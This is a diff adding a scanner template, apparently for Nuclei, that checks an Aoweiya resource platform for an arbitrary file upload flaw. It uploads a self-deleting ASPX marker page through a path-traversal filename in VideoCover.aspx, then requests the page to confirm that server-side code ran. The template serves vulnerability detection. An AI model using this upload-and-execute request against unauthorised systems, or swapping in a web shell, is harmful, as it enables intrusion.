@@ -1,0 +1,40 @@
+id: aoweiya-videocover-fileupload
+
+info:
+  name: aoweiya-videocover-fileupload
+  author: HuanXiong
+  severity: critical
+
+  tags: File Upload
+
+variables:
+  filename: "{{to_lower(rand_base(8))}}"
+
+http:
+  - raw:
+    - |
+      POST /Tools/Video/VideoCover.aspx HTTP/1.1
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+      Host: {{Hostname}}
+      Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+      Content-Length: 301
+      Connection: close
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="file"; filename="/../../../AVA.ResourcesPlatform.WebUI/{{filename}}.aspx"
+      Content-Type: image/png
+
+      <%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+      --00content0boundary00--
+
+    - |
+      GET /{{filename}}.aspx HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: text/plain
+      Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+         - 'status_code==200 && contains_all(body_2,"12321")'
